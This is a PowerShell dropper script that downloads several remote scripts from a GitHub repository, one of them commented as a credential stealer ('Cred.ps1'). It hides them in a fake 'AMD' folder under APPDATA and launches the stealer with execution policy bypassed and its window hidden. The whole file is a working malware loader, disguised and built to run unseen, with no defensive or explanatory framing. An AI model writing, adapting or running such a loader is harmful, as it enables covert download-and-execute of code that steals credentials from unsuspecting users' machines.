# Define the URLs of the files to download
# $url1 = "https://lnkfwd.com/u/LPWEPwX9" # Cred.ps1
$url1 = "https://raw.githubusercontent.com/srve650/WifingPato/refs/heads/main/AllinOneV2.ps1" #ALLinone CRED.ps1 + treewin.ps1
$url2 = "https://raw.githubusercontent.com/srve650/WifingPato/refs/heads/main/ConvertNrun.ps1" # ConvertNrun.ps1
$url3 = 'https://raw.githubusercontent.com/srve650/WifingPato/refs/heads/main/Rammap.txt' # RAMMap.txt
$url4 = 'https://raw.githubusercontent.com/srve650/WifingPato/refs/heads/main/ClearCache.vbs' # ClearCache.vbs
# $url5 = 'https://lnkfwd.com/u/LPWudNLf' # treewin.ps1

# Define the destination paths in the %TEMP% directory
$destination1 = "$env:TEMP\Cred.ps1"
$destination2 = "$env:APPDATA\AMD\ConvertNrun.ps1"
$destination3 = "$env:APPDATA\AMD\RAMMap.txt"
$destination4 = "$env:APPDATA\AMD\ClearCache.vbs"
# $destination5 = "$env:TEMP\treewin.ps1"

# Create the AMD directory if it doesn't exist
$amdDirectory = "$env:APPDATA\AMD"

# Check if the AMD directory exists and delete it if it does
if (Test-Path -Path $amdDirectory) {
    # Remove the existing AMD directory and all its contents
    Remove-Item -Path $amdDirectory -Recurse -Force
}

# Create a new AMD directory
New-Item -ItemType Directory -Path $amdDirectory

# Download
Invoke-WebRequest -Uri $url1 -OutFile $destination1
Invoke-WebRequest -Uri $url2 -OutFile $destination2
Invoke-WebRequest -Uri $url3 -OutFile $destination3
Invoke-WebRequest -Uri $url4 -OutFile $destination4
# Invoke-WebRequest -Uri $url5 -OutFile $destination5


# Set the downloaded files in C:\AMD as hidden
$filesToHide = @($destination2, $destination3, $destination4)

foreach ($file in $filesToHide) {
    if (Test-Path -Path $file) {
        # Set the file attribute to Hidden
        $filePath = Join-Path -Path $amdDirectory -ChildPath (Split-Path -Path $file -Leaf)
        if (Test-Path -Path $filePath) {
            Set-ItemProperty -Path $filePath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
        }
    }
}


# Run the second script (Ain1.ps1) from the %TEMP% directory after the first finishes
Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$env:TEMP\Cred.ps1`"" # -Wait

# # Run the second script (Ain1.ps1) from the %TEMP% directory after the first finishes
# Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$env:TEMP\TreeWin.ps1`""

